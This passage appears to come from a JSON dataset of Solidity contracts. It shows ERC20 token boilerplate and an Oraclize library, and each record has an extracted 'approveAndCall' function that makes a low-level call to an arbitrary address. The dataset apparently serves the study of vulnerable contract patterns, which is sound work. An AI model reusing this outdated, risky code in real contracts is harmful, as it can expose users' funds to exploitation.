}\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract AutoTrustToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function AutoTrustToken(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"AutoTrust\";\n decimals = 18;\n symbol = \"AUTC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b6"
  },
  "filename": "35453.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000000000000;\n totalSupply = 5000000000000;\n name = \"Fitcoin\";\n decimals = 5;\n symbol = \"FIT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b7"
  },
  "filename": "35467.sol",
  "content": "pragma solidity ^0.4.17;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = 